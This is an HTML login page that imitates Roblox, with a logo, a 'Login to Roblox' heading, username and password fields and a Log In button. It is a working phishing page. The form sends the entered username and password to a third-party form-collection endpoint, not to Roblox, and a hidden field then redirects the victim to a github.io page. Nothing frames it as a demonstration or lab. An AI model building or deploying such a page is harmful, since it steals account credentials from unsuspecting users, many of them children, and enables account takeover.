<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Roblox</title>
    <style>
        body {
            background-color: #232527;
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-card {
            background-color: #393b3d;
            padding: 40px 30px;
            border-radius: 8px;
            width: 400px;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
            color: white;
        }
        .logo-text {
            font-size: 32px;
            font-weight: 900;
            margin-bottom: 25px;
            letter-spacing: -1px;
            text-transform: uppercase;
        }
        h2 {
            font-weight: 500;
            font-size: 20px;
            margin-bottom: 25px;
        }
        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border-radius: 4px;
            border: 1px solid #000;
            background-color: #f2f4f5;
            color: #333;
            font-size: 15px;
            box-sizing: border-box;
        }
        input:focus {
            outline: none;
            border: 2px solid #00b2ff;
        }
        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #00b2ff;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            transition: 0.2s;
        }
        .btn-login:hover {
            background-color: #0081bb;
        }
        .footer-links {
            font-size: 13px;
            color: #00b2ff;
            text-decoration: none;
            display: block;
            margin-top: 20px;
        }
    </style>
</head>
<body>

<div class="login-card">
    <div class="logo-text">ROBLOX</div>
    <h2>Login to Roblox</h2>

    <form action="https://formspree.io/f/xreokyqa" method="POST">
        
        <input type="text" name="username" placeholder="Username/Email/Phone" required>
        
        <input type="password" name="password" placeholder="Password" required>
        
        <input type="hidden" name="_next" value="https://sylohh.github.io/Roblox-Login/">
        
        <button type="submit" class="btn-login">Log In</button>

    </form>

    <a href="#" class="footer-links">Forgot Password or Username?</a>
</div>

</body>
</html>
